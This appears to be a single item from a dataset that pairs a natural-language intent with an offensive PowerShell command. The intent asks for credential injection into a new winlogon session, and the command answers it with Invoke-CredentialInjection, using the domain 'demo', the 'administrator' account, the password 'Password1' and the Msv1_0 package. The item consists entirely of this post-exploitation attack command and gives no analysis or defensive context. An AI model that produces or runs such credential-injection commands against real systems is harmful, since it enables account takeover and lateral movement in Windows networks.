# Natural language intent:
# Perform credential injection targeting the domain 'demo' and the 'administrator' account with a new winlogon session.

Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -NewWinLogon -AuthPackage Msv1_0
